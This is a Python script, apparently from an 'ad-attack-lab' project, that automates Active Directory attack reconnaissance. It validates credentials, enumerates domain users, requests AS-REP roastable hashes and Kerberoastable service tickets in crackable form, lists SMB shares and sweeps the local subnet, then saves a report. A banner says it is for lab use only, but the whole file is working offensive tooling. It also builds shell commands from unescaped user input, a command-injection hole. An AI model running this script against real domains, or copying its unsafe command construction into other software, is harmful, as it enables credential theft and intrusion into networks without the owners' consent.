#!/usr/bin/env python3
"""
ad_recon.py — Active Directory Reconnaissance Tool
Autor: Clark Espinal
Uso: python3 ad_recon.py -d corp.local -u j.smith -p Password123! -dc 10.10.10.10
"""

import argparse
import subprocess
import sys
from datetime import datetime


# Colores
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
GRAY   = "\033[90m"
RESET  = "\033[0m"
BOLD   = "\033[1m"


def banner():
    print(f"""
{RED}
  █████╗ ██████╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
 ██╔══██╗██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
 ███████║██║  ██║    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
 ██╔══██║██║  ██║    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
 ██║  ██║██████╔╝    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
 ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
{RESET}
  {YELLOW}ad-attack-lab{RESET} — Active Directory Recon Tool
  {GRAY}Solo para uso en entornos de laboratorio controlados{RESET}
""")


def print_section(title):
    print(f"\n{YELLOW}{'='*65}{RESET}")
    print(f"{YELLOW}  {title}{RESET}")
    print(f"{YELLOW}{'='*65}{RESET}")


def run_command(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[-] Comando timeout"
    except Exception as e:
        return f"[-] Error: {e}"


def check_dc(dc, domain, username, password):
    print_section("VALIDANDO CREDENCIALES")
    cmd = (
        f"netexec smb {dc} "
        f"-u '{username}' -p '{password}' "
        f"-d '{domain}'"
    )
    output = run_command(cmd)
    if "Pwn3d!" in output:
        print(f"{RED}[!] {username} es ADMIN en {dc}{RESET}")
    elif "[+]" in output:
        print(f"{GREEN}[+] Credenciales validas{RESET}")
    else:
        print(f"{RED}[-] Credenciales invalidas o error{RESET}")
        sys.exit(1)
    print(output)
    return output


def enum_users(dc, domain, username, password):
    print_section("USUARIOS DEL DOMINIO")
    cmd = (
        f"impacket-GetADUsers -all "
        f"'{domain}/{username}:{password}' "
        f"-dc-ip {dc}"
    )
    output = run_command(cmd)
    print(output)
    return output


def enum_asrep(dc, domain, username, password):
    print_section("AS-REP ROASTABLE (DONT_REQ_PREAUTH)")
    cmd = (
        f"impacket-GetNPUsers "
        f"'{domain}/{username}:{password}' "
        f"-dc-ip {dc} -request -format hashcat"
    )
    output = run_command(cmd)
    print(output)
    return output


def enum_kerberoast(dc, domain, username, password):
    print_section("KERBEROASTABLE (SPNs)")
    cmd = (
        f"impacket-GetUserSPNs "
        f"'{domain}/{username}:{password}' "
        f"-dc-ip {dc} -request"
    )
    output = run_command(cmd)
    print(output)
    return output


def enum_shares(dc, domain, username, password):
    print_section("SHARES SMB EN EL DC")
    cmd = (
        f"netexec smb {dc} "
        f"-u '{username}' -p '{password}' "
        f"-d '{domain}' --shares"
    )
    output = run_command(cmd)
    print(output)
    return output


def enum_hosts(dc, domain, username, password):
    print_section("HOSTS EN LA RED INTERNA")
    network = ".".join(dc.split(".")[:3]) + ".0/24"
    cmd = (
        f"netexec smb {network} "
        f"-u '{username}' -p '{password}' "
        f"-d '{domain}'"
    )
    output = run_command(cmd)
    print(output)
    return output


def save_report(results, domain, username):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{timestamp}_ad_recon_{domain}.txt"
    with open(filename, "w") as f:
        f.write(f"AD Recon Report\n")
        f.write(f"Domain:    {domain}\n")
        f.write(f"User:      {username}\n")
        f.write(f"Date:      {datetime.now()}\n")
        f.write("="*50 + "\n\n")
        for section, output in results.items():
            f.write(f"\n{'='*50}\n")
            f.write(f"  {section}\n")
            f.write(f"{'='*50}\n")
            f.write(output + "\n")
    print(f"\n{GREEN}[+] Reporte guardado: {filename}{RESET}")
    return filename


def print_results(results):
    print_section("RESUMEN FINAL")
    asrep_found    = "$krb5asrep$" in results.get("AS-REP ROAST", "")
    kerb_found     = "$krb5tgs$"   in results.get("KERBEROAST", "")
    pwned          = "Pwn3d!"      in results.get("CREDENCIALES", "")

    print(f"  Credenciales validas : {GREEN}SI{RESET}")
    print(f"  Admin detectado      : {RED + 'SI' + RESET if pwned else GRAY + 'NO' + RESET}")
    print(f"  AS-REP Roastable     : {RED + 'SI' + RESET if asrep_found else GRAY + 'NO' + RESET}")
    print(f"  Kerberoastable       : {RED + 'SI' + RESET if kerb_found else GRAY + 'NO' + RESET}")


def main():
    banner()

    parser = argparse.ArgumentParser(
        description="AD Recon Tool — Enumeracion automatica de Active Directory"
    )
    parser.add_argument("-d",  "--domain",   required=True, help="Dominio (ej: corp.local)")
    parser.add_argument("-u",  "--username", required=True, help="Usuario")
    parser.add_argument("-p",  "--password", required=True, help="Password")
    parser.add_argument("-dc", "--dc-ip",    required=True, help="IP del Domain Controller")
    parser.add_argument("-o",  "--output",   action="store_true", help="Guardar reporte en txt")
    args = parser.parse_args()

    print(f"{CYAN}[*] Dominio  : {args.domain}{RESET}")
    print(f"{CYAN}[*] Usuario  : {args.username}{RESET}")
    print(f"{CYAN}[*] DC       : {args.dc_ip}{RESET}")
    print(f"{CYAN}[*] Inicio   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")

    results = {}
    results["CREDENCIALES"]  = check_dc(args.dc_ip, args.domain, args.username, args.password)
    results["USUARIOS"]      = enum_users(args.dc_ip, args.domain, args.username, args.password)
    results["AS-REP ROAST"]  = enum_asrep(args.dc_ip, args.domain, args.username, args.password)
    results["KERBEROAST"]    = enum_kerberoast(args.dc_ip, args.domain, args.username, args.password)
    results["SHARES"]        = enum_shares(args.dc_ip, args.domain, args.username, args.password)
    results["HOSTS"]         = enum_hosts(args.dc_ip, args.domain, args.username, args.password)

    print_results(results)

    if args.output:
        save_report(results, args.domain, args.username)

    print(f"\n{GREEN}[+] Enumeracion completa{RESET}\n")


if __name__ == "__main__":
    main()
